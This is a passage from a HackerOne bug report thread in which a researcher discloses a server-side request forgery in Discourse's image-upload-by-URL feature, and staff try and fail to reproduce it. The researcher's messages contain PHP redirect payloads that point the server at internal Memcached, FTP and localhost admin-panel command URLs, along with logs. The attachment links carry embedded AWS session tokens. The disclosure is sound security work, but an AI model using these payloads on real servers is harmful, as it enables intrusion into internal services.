                    "type": "image/png", 
                    "id": 185935, 
                    "filename": "vulnerable_function.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/185/934/7f44b21cfb2cf8664f190d5cf233715e154a19ed/request.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b3987084064d29bab2dae7e30bf3f3e9eb7dc8884a56434327c1e4a5cd0b5f52", 
                    "type": "image/png", 
                    "id": 185934, 
                    "filename": "request.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-05-19T04:14:55.125Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T04:18:20.476Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hi,\n\nThe impact affect only the function that allow to upload image over URL.\n\n1. Attacker click to upload image using external URL\n2. Attacker submit a url to malicious .php file\n<?php\n        header('Location: dict://localhost:11211/stat');\n?>\n\n3. The file contais redirect to link with internal resources\n4. after attacker send message the server will send malicious request and access internal resources on port 11211 \"localhost:11211/stat\"\n\n\nvulnerable_function.png screens show the affected vulnerable function\nrequest.png shows full setup how to reproduce the steps.\n\n\nHere is the attack scenario.\n\nEvery localhost server ip is 127.0.0.1 or 0.0.0.0. If attacker is allow to send any internal server side request he can use this impact to send malicious request to internal resources and  access the administrator panles or functions without additional authentication.\n\n\nLets say your server is providing  some script administrative panel that do not require authentication on port 1234. The script allow to execute system commands, and the request is following http://127.0.0.1:1234/my_panel.php?cmd=ls. The script is not dangerous because it is only localhost script and no one have access to the script from world wide as the port 1234 is only internal and filtred behaind the firewall.\n\n1. Attacker click to upload image using external URL\n2. Attacker submit a url to malicious3 .php file by uploading IMG using external URL  ( like on screens)\n\"TESTa [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\"\n2. Attacker send the message\n3. Server trying to reach the maliciou3.php file\n4. Attacker used a evil script to redirect the server to local resources\n\n<?php\n        header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c 192.166.218.53');\n?>\n\n5. Your servers followed the redirect and sent a \"http://127.0.0.1:1234/my_panel.php?cmd=ping -c 192.166.218.53\" request to local resources.\n6. The attacker was able to execute system  command on your local script that is not accessible  from internet because  you allowed to send any request from your server.\n\nAttacker is able to send any internal or external server side request to any available protocol in the client that execute the payload.\n\nSummary:\n\nThe upload function using external URL should check if the requested link was provided to a valid image file. The addational check should look if the response from the server was \"200\" and if the image on remote server exists. If the server trying to redirect with code \"302\", the server should block that request and do not follow the redirection.\n\nI think now all is clear, soory if previous reports was not clear. If still u don understand the impact please follow the links i wrote. Both of the article and other vulnerability on hackerone.com show sthe impact and security issue.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>The impact affect only the function that allow to upload image over URL.</p>\n\n<ol>\n<li>Attacker click to upload image using external URL</li>\n<li><p>Attacker submit a url to malicious .php file<br>\n&lt;?php<br>\n    header(&#39;Location: dict://localhost:11211/stat&#39;);<br>\n?&gt;</p></li>\n<li><p>The file contais redirect to link with internal resources</p></li>\n<li><p>after attacker send message the server will send malicious request and access internal resources on port 11211 &quot;localhost:11211/stat&quot;</p></li>\n</ol>\n\n<p>vulnerable_function.png screens show the affected vulnerable function<br>\nrequest.png shows full setup how to reproduce the steps.</p>\n\n<p>Here is the attack scenario.</p>\n\n<p>Every localhost server ip is 127.0.0.1 or 0.0.0.0. If attacker is allow to send any internal server side request he can use this impact to send malicious request to internal resources and  access the administrator panles or functions without additional authentication.</p>\n\n<p>Lets say your server is providing  some script administrative panel that do not require authentication on port 1234. The script allow to execute system commands, and the request is following <a title=\"http://127.0.0.1:1234/my_panel.php?cmd=ls\" href=\"/redirect?signature=c8a37b525efbb9ac05e7d53a0a5b8acd3887c834&amp;url=http%3A%2F%2F127.0.0.1%3A1234%2Fmy_panel.php%3Fcmd%3Dls\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1234/my_panel.php?cmd=ls</span><i class=\"icon-external-link\"></i></a>. The script is not dangerous because it is only localhost script and no one have access to the script from world wide as the port 1234 is only internal and filtred behaind the firewall.</p>\n\n<ol>\n<li>Attacker click to upload image using external URL</li>\n<li>Attacker submit a url to malicious3 .php file by uploading IMG using external URL  ( like on screens)\n&quot;TESTa <a href=\"/redirect?signature=65972a013a991377870d9b9bb1d192228dff8aa1&amp;url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>![](http://192.166.218.53/malicious3.php)</span><i class=\"icon-external-link\"></i></a>&quot;</li>\n<li>Attacker send the message</li>\n<li>Server trying to reach the maliciou3.php file</li>\n<li>Attacker used a evil script to redirect the server to local resources</li>\n</ol>\n\n<p>&lt;?php<br>\n        header(&#39;Location: <a title=\"http://127.0.0.1:1234/mypanel.php?cmd=ping\" href=\"/redirect?signature=ecebe74f9fd0ea34ac93cf3b4f14c89939ff842e&amp;url=http%3A%2F%2F127.0.0.1%3A1234%2Fmypanel.php%3Fcmd%3Dping\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1234/mypanel.php?cmd=ping</span><i class=\"icon-external-link\"></i></a> -c 192.166.218.53&#39;);<br>\n?&gt;</p>\n\n<ol>\n<li>Your servers followed the redirect and sent a &quot;<a title=\"http://127.0.0.1:1234/my_panel.php?cmd=ping\" href=\"/redirect?signature=a989a715707451f8d3c4dc37c5f4f548f07fa300&amp;url=http%3A%2F%2F127.0.0.1%3A1234%2Fmy_panel.php%3Fcmd%3Dping\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1234/my_panel.php?cmd=ping</span><i class=\"icon-external-link\"></i></a> -c 192.166.218.53&quot; request to local resources.</li>\n<li>The attacker was able to execute system  command on your local script that is not accessible  from internet because  you allowed to send any request from your server.</li>\n</ol>\n\n<p>Attacker is able to send any internal or external server side request to any available protocol in the client that execute the payload.</p>\n\n<p>Summary:</p>\n\n<p>The upload function using external URL should check if the requested link was provided to a valid image file. The addational check should look if the response from the server was &quot;200&quot; and if the image on remote server exists. If the server trying to redirect with code &quot;302&quot;, the server should block that request and do not follow the redirection.</p>\n\n<p>I think now all is clear, soory if previous reports was not clear. If still u don understand the impact please follow the links i wrote. Both of the article and other vulnerability on hackerone.com show sthe impact and security issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1684998, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T04:51:05.331Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T04:55:25.480Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Ps. About your question.\nThe issue is that you allow redirects and allow to submit requests to other protocols too. Attacker should not be able to control the protocol and send any server side requests. Attacker do not need to know what is your ip like you wrote \"1.2.3.4\", as the requests are internal he can use \"localhost\", \"127.0.0.1\" or \"0.0.0.0\" instead of Ip Or domain. Ftp://127.0.0.1 request will send ftp request from your host to port 22 localy.", 
            "markdown_message": "<p>Ps. About your question.<br>\nThe issue is that you allow redirects and allow to submit requests to other protocols too. Attacker should not be able to control the protocol and send any server side requests. Attacker do not need to know what is your ip like you wrote &quot;1.2.3.4&quot;, as the requests are internal he can use &quot;localhost&quot;, &quot;127.0.0.1&quot; or &quot;0.0.0.0&quot; instead of Ip Or domain. <a title=\"ftp://127.0.0.1\" href=\"/redirect?signature=1ad62dc33f972f4239c7a9bce0ecc1e745bb5b3f&amp;url=ftp%3A%2F%2F127.0.0.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://127.0.0.1</span><i class=\"icon-external-link\"></i></a> request will send ftp request from your host to port 22 localy.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1685032, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T04:53:23.530Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T04:58:58.584Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "To resolve the issue you need to chcek if the provided external url link is starting with valid protocol http:// or https://, ,also chcek if the valid url is a real image file, and block the redirections.", 
            "markdown_message": "<p>To resolve the issue you need to chcek if the provided external url link is starting with valid protocol http:// or https://, ,also chcek if the valid url is a real image file, and block the redirections.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1685036, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T19:23:05.654Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T19:23:05.654Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "@marpo I have been trying to reproduce the protocol error all afternoon with no luck. I have tried with the codes you used above (but with different IPs) but no matter what I do it doesn't access my FTP site as your logs show.\n\nThis agrees with #228851 which indicates that they couldn't get protocol URLs to work. The only thing I can think of is perhaps this was already patched?\n\nCan you please confirm that it is still working, and if so the exact input you used to do it? Because at this point I am out of ideas.\n\n", 
            "markdown_message": "<p><a href=\"/marpo\">@marpo</a> I have been trying to reproduce the protocol error all afternoon with no luck. I have tried with the codes you used above (but with different IPs) but no matter what I do it doesn&#39;t access my FTP site as your logs show.</p>\n\n<p>This agrees with <a href=\"/reports/228851\">#228851</a> which indicates that they couldn&#39;t get protocol URLs to work. The only thing I can think of is perhaps this was already patched?</p>\n\n<p>Can you please confirm that it is still working, and if so the exact input you used to do it? Because at this point I am out of ideas.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1686911, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-19T19:23:44.070Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T19:23:44.070Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "@marpo (to be clear, I noticed my *browser* is hitting the FTP as a redirect. It is the server side request that II cannot reproduce.)", 
            "markdown_message": "<p><a href=\"/marpo\">@marpo</a> (to be clear, I noticed my <em>browser</em> is hitting the FTP as a redirect. It is the server side request that II cannot reproduce.)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1686912, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/194/e523bbdc300dfa0c24ceeea063e5fcca2fab89e8/before.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f73c36600a949c546b1dac2a3461a1390f354f0469e6a88f406ecd677d97bb1", 
                    "type": "image/png", 
                    "id": 186194, 
                    "filename": "before.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/193/1b00dd35c24a79630adafd2b061047f3ceda8ea2/after.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d04f094e9f71c76dce994e45b6efe675d2a516a7fdacc16963378235169831e0", 
                    "type": "image/png", 
                    "id": 186193, 
                    "filename": "after.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-05-19T19:42:53.727Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T19:42:53.727Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hay @discourse_team ,\nI am still able to use the ftp request look the following screens\n\n1. \"before.png\" - I opened new composer and clicked the upload img then switched to url part, then i submited the url to my file \"http://192.168.218.53/malicious3.php\n\nroot@fixyour:/var/www/html# cat /var/www/html/malicious3.php\n<?php\n        header('Location: ftp://192.166.218.53');\n?>\n\nAnd i sent the message. Please note that i showed you my vsftpd.log file with last attempt of\n\"Fri May 19 05:03:26 2017 [pid 12497] [admin] FAIL LOGIN: Client \"::ffff:182.74.27.226\"\n\"\n\n2. \"after.png\" - After the payload was sent the server sent a request to my own server with a ftp request i showed you the last attempt from ip \"64.71.168.198\"\n\nThe try.discourse.org ip address looks similar:\n\nroot@fixyour:/var/www/html# ping try.discourse.org\nPING try.bydiscourse.com (64.71.168.206) 56(84) bytes of data.\n64 bytes from 64.71.168.206: icmp_seq=1 ttl=51 time=174 ms\n64 bytes from 64.71.168.206: icmp_seq=2 ttl=51 time=174 ms\n\nIts looks legit for me as i did not put a port :22 in url so the protocol was accept and the discourse server was auto redirect to protocl :22 by submiting the ftp:// part.\n\nTry to follow my steps on the both screens if u cant reproduce it i can show it on live stream or make an video for you.\n\nCheers afine.pl", 
            "markdown_message": "<p>Hay <a href=\"/discourse_team\">@discourse_team</a> ,<br>\nI am still able to use the ftp request look the following screens</p>\n\n<ol>\n<li>&quot;before.png&quot; - I opened new composer and clicked the upload img then switched to url part, then i submited the url to my file &quot;<a title=\"http://192.168.218.53/malicious3.php\" href=\"/redirect?signature=227668214a8a6fc1ef4f3345a10b1357afa8992a&amp;url=http%3A%2F%2F192.168.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://192.168.218.53/malicious3.php</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ol>\n\n<p>root@fixyour:/var/www/html# cat /var/www/html/malicious3.php<br>\n&lt;?php<br>\n        header(&#39;Location: <a title=\"ftp://192.166.218.53&#39;\" href=\"/redirect?signature=58e7272e63489b322e5c1686229b73b0564cefe2&amp;url=ftp%3A%2F%2F192.166.218.53%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://192.166.218.53&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt;</p>\n\n<p>And i sent the message. Please note that i showed you my vsftpd.log file with last attempt of<br>\n&quot;Fri May 19 05:03:26 2017 [pid 12497] [admin] FAIL LOGIN: Client &quot;::ffff:182.74.27.226&quot;<br>\n&quot;</p>\n\n<ol>\n<li>&quot;after.png&quot; - After the payload was sent the server sent a request to my own server with a ftp request i showed you the last attempt from ip &quot;64.71.168.198&quot;</li>\n</ol>\n\n<p>The try.discourse.org ip address looks similar:</p>\n\n<p>root@fixyour:/var/www/html# ping try.discourse.org<br>\nPING try.bydiscourse.com (64.71.168.206) 56(84) bytes of data.<br>\n64 bytes from 64.71.168.206: icmp_seq=1 ttl=51 time=174 ms<br>\n64 bytes from 64.71.168.206: icmp_seq=2 ttl=51 time=174 ms</p>\n\n<p>Its looks legit for me as i did not put a port :22 in url so the protocol was accept and the discourse server was auto redirect to protocl :22 by submiting the ftp:// part.</p>\n\n<p>Try to follow my steps on the both screens if u cant reproduce it i can show it on live stream or make an video for you.</p>\n\n<p>Cheers afine.pl</p>\n", 
            "type": "Activities::Comment", 
            "id": 1686942, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/197/f85845731920148d932015c21d8c60da3b355530/dict.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85844c2660a96aebdd0c776f7f9c171ba5adcd3eeff0f3f6b761d6d6cfcb15b3", 
                    "type": "image/png", 
                    "id": 186197, 
                    "filename": "dict.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-05-19T20:01:49.511Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T20:01:49.511Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "But interesting part is that when i use http protocl now for example:\n\n<?php\n        header('Location: http://192.166.218.53');\n?>\n\nThen the request sending by discourse server  is different  then before because in my log file i cannot see a Ruby client request anymore\n\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] \"HEAD / HTTP/1.1\" 200 255 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] \"GET / HTTP/1.1\" 200 11576 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n\nLooks like some1 did something with the Ruby client so far.\n", 
            "markdown_message": "<p>But interesting part is that when i use http protocl now for example:</p>\n\n<p>&lt;?php<br>\n        header(&#39;Location: <a title=\"http://192.166.218.53&#39;\" href=\"/redirect?signature=120dd91d8efe2f577afe44db8f88950f1c7980e2&amp;url=http%3A%2F%2F192.166.218.53%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://192.166.218.53&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\n?&gt;</p>\n\n<p>Then the request sending by discourse server  is different  then before because in my log file i cannot see a Ruby client request anymore</p>\n\n<p>64.71.168.198 - - [19/May/2017:15:57:04 -0400] &quot;HEAD / HTTP/1.1&quot; 200 255 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;<br>\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] &quot;GET / HTTP/1.1&quot; 200 11576 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;</p>\n\n<p>Looks like some1 did something with the Ruby client so far.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687012, 
            "genius_execution_id": null
        }, 
        {
            "removed_user": {
                "url": "/mlitchfield", 
                "username": "mlitchfield"
            }, 
            "automated_response": false, 
            "created_at": "2017-05-19T20:03:57.403Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T20:03:57.403Z", 
            "actor": {
                "username": "mlitchfield", 
                "url": "/mlitchfield", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/748/280394c6f7fb9d7cc77647d9839f5ebdd534b7e1_medium.png?1440553412"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserRemoved", 
            "id": 1687020, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/186/205/3e8cd8b251a6004b138968a631322a0de74d06b2/ruby.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223700Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f7c050385a9f320213ef311c875bb3f22fc6023136036559208ee8f2adc20a36", 
                    "type": "image/png", 
                    "id": 186205, 
                    "filename": "ruby.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-05-19T20:09:54.911Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-19T20:09:54.911Z", 
            "actor": {
                "username": "afine-team", 
                "url": "/afine-team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/154/398/59c443251ca104fa72a94b280e80888347515149_medium.png?1490796800"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "ps.\n\nHere is the old log file from the day i submited the report. The attached screens shows the request to malicious3.php file with redirect i am no longer able to reproduce the Ruby client redirect only the other client that the script use. Looks like some1 already fixed the Ruby request part. but the impact still exists, as my ftp:// requests shows.\n\n", 
            "markdown_message": "<p>ps.</p>\n\n<p>Here is the old log file from the day i submited the report. The attached screens shows the request to malicious3.php file with redirect i am no longer able to reproduce the Ruby client redirect only the other client that the script use. Looks like some1 already fixed the Ruby request part. but the impact still exists, as my ftp:// requests shows.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1687038, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
